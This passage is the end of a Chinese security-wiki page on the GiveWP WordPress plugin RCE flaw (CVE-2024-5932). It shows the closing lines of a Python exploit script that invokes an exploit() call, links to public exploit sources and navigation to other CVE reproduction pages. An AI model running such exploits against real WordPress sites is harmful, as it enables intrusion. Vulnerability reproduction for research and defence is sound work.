    <span class="n">GiveWPExploit</span><span class="o">.</span><span class="n">spinner</span><span class="p">(</span><span class="n">duration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">cve_exploit</span><span class="o">.</span><span class="n">exploit</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>
<h2 id="_3">漏洞来源<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/EQSTLab/CVE-2024-5932">https://github.com/EQSTLab/CVE-2024-5932</a></li>
<li><a href="https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/">https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../WordPress%E6%8F%92%E4%BB%B6GutenKit%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28CVE-2024-9234%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../WordPress%E6%8F%92%E4%BB%B6GutenKit%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28CVE-2024-9234%29/" class="btn btn-xs btn-link">
        WordPress插件GutenKit存在任意文件上传漏洞(CVE-2024-9234)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../WordPress%E6%8F%92%E4%BB%B6FileUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2024-9047%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../WordPress%E6%8F%92%E4%BB%B6FileUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2024-9047%29/" class="btn btn-xs btn-link">
        WordPress插件FileUpload任意文件读取漏洞复现(CVE-2024-9047)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>